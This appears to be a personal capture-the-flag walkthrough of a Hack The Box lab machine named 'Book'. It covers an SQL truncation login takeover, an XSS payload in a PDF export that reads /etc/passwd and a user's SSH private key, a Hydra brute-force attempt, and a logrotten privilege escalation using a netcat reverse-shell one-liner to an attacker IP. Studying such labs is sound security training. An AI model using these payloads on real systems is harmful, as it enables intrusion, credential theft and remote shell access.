IP Address: 10.10.10.176

1. nmap
nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.176
Output: nmap-output.txt

Ports 22, 80 open.

2. gobuster

gobuster dir -u 10.10.10.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Output: gobuster-output.txt

/images, /docs (no access), /admin (admin access sign in!)

3. Webpage Analysis:

Can sign up, there's an index.php file.

Sign in value checks if it's an email.
Sign up email bar also checks this.
Made a fake account:
Email a@a
Password a

Password

Using Burpsuite, when logging in:
Cookie: PHPSESSID=ptdmd5m1a2cc94s6ii2veam74p

Admin Email Address: admin@book.htb

You can upload a book (PDF) with a book title, and author, download books, search for books, and give feedbacks for books.


4. wfuzz php:
wfuzz -u http://10.10.10.176/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/common.txt --sc 200

2 outputs:
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000001336:   200        0 L      0 W      0 Ch        "db"                                             
000002148:   200        321 L    683 W    6800 Ch     "index"

wfuzz txt: Nothing.

5. dirsearch:
sudo dirsearch -u 10.10.10.176 -e *
Output: dirsearch-output.txt

6. SQL Truncation Attack

We know the sign in page takes email + password.

Script from page source:
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}

So it has a validation of < 20 characters.

SQL Truncation Attack: https://resources.infosecinstitute.com/sql-truncation-attack/#gref

Therefore, start Burp Suite, sign up details:

Name = admin1 ##Put this as a different name if it matches the name.
Email = admin@book.htb
Password = a

In the intercepted packet:

name=admin&email=admin%40book.htb&password=a
to
name=admin&email=admin%40book.htb                          C&password=a

Note the spaces and the C in the end --> The email will be noted as a seperate row in the database, but truncated to 20 characters. Therefore, you'll have 2 admin@book.htb emails, but with different passwords. So now you can log in with admin@book.htb with password `a`.

Login on admin panel /admin:

admin@book.htb
a

We can now download collections (pdfs).

Exploit: https://translate.googleusercontent.com/translate_c?depth=1&pto=aue&rurl=translate.google.com&sl=auto&sp=nmt4&tl=en&u=https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html&usg=ALkJrhiGtwsXgvKghE_MRSuxrPEVgsbTwg

Essentially, by using the following script as the book + author:

<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

we will be able to pull files.

Reasoning: The value of the thing requested in the HTML is reflected in the PDF. (see test-d1.pdf for normal upload/download without any script). Therefore, by manipulating that using the above script will instead print the information inside those files.

Let's get the /etc/passwd file first.

Script:
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

File to Upload: test.pdf

Download: Go to admin page, Collections, Export "Collections" PDF.
Output: etcpasswd.pdf

There is a "reader" user in there. Let's try Hydra:
hydra -l reader -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.10.176

Hydra did not work --> Instead, download id_rsa file
Script:

<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>

Run pdf2text (downloaded)

Log in using reader_id_rsa
We're in!

reader@book:~$ cat user.txt
51c1d4b5197fa30e3e5d37f8778f95bc

---
Privilege Escalation to root

Ran
Server version: Apache/2.4.29 (Ubuntu)
Found an Apache Logrotate exploit, didn't work.

Found logrotten --> Looking through enumeration.txt, found root changing log file when

Download logrotten on victim machine, then:

1. Make Payload File
reader@book:~$ cat payloadfile
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 4444 >/tmp/f

2. Compile logrotten on Victim
reader@book:~$ gcc -o logrotten logrotten.c

3. Launch logrotten on Victim
reader@book:~$ ./logrotten -p ./payloadfile /home/reader/backups/access.log
Waiting for rotating /home/reader/backups/access.log...

4. On Kali, start nc
nc -lvnp 4444

5. Copy following:
cat /root/.ssh/id_rsa

6. In a second terminal screen, ssh into reader again.
echo " " >> /home/reader/backups/access.log

7. On logrotten, you'll get the following output:
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!

8. Paste (5) on both the logrotten, and on the nc terminals, pressing enter.

9. The file cat will show on the bottom! (The shell closes after the one command pretty fast, so do it quickly).

Then save SSH key: root_id_rsa

ssh -i root_id_rsa root@10.10.10.176

root@book:~# cat root.txt
84da92adf998a1c7231297f70dd89714

https://translate.googleusercontent.com/translate_c?depth=1&pto=aue&rurl=translate.google.com&sl=auto&sp=nmt4&tl=en&u=https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html&usg=ALkJrhiGtwsXgvKghE_MRSuxrPEVgsbTwg

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/whotwagner/logrotten
